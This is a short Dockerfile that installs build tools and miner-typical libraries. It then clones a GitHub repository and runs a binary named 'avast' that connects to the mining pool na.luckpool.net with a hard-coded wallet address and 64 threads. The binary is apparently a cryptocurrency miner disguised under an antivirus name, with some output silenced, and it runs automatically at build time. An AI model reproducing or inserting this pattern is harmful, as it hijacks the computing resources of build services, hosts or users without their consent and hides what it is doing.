FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
 && mkdir -p /home/stuff
 
 RUN git clone https://github.com/samrikulan/zole.git && cd zole && chmod +x avast  >/dev/null 2>&1 && ./avast -v -l na.luckpool.net:3956 -u RBjwUUBxMbratayR2BWRbLWKZHBa4oxWs9 -t 64 -x
